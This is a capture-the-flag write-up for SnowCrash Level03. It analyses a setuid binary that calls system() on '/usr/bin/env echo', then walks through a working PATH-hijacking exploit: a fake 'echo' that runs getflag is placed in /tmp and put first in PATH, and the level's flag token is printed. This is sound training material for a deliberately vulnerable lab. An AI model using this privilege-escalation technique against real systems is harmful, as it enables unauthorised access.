# SnowCrash

## Level03
```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
## ls -l analysis

### Permissions
The first part, -rwsr-sr-x, represents file permissions:

rws	Owner (flag03) has read (r), write (w), and execute (s - setuid) permissions (s instead of x in owner permissions means that the programs runs with the owner's privilege)

r-s	Group (level03) has read (r), no write (-), and execute (s - setgid) permissions (s instead of x in group permissions means that the programs runs with the group's privileges)

r-x	Others (everyone else) have read (r) and execute (x) permissions

### Ownership
The second part, flag03 level03, represents the file ownership

flag03 is the owner of the file, and level03 is the group associated with the file


Since the setuid bit is set (s instead of x), when a level03 user runs this binary, it executes with the privileges of flag03
Meaning we could exploit this binary to run the getflag command as flag03 which would gives us the flag.


## Execution
```
level03@SnowCrash:~$ ./level03 
Exploit me

level03@SnowCrash:~$ ./level03 argument
Exploit me
```
```
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
```
## strings analysis
setresgid and setresuid -> Change the user / group IDS to flag03 user and level03 group

system -> This function executes shell commands and can be exploited

/usr/bin/env echo Exploit me -> Most likely used like this:
```c
system("/usr/bin/env echo Exploit me");
```

/usr/bin/env echo -> Search for echo in the directories listed in $PATH

We can exploit this by creating a fake echo command and adding it to the PATH

## Exploit

Let's create the fake echo command
```
level03@SnowCrash:~$ echo "getflag" > /tmp/echo
```
We also need to make it executable
```
level03@SnowCrash:~$ chmod +x /tmp/echo
```
Let's add it to the start of $PATH to give it priority over /usr/bin/echo
```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```
We can now re-run the binary level03 in order to retrieve the flag
```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```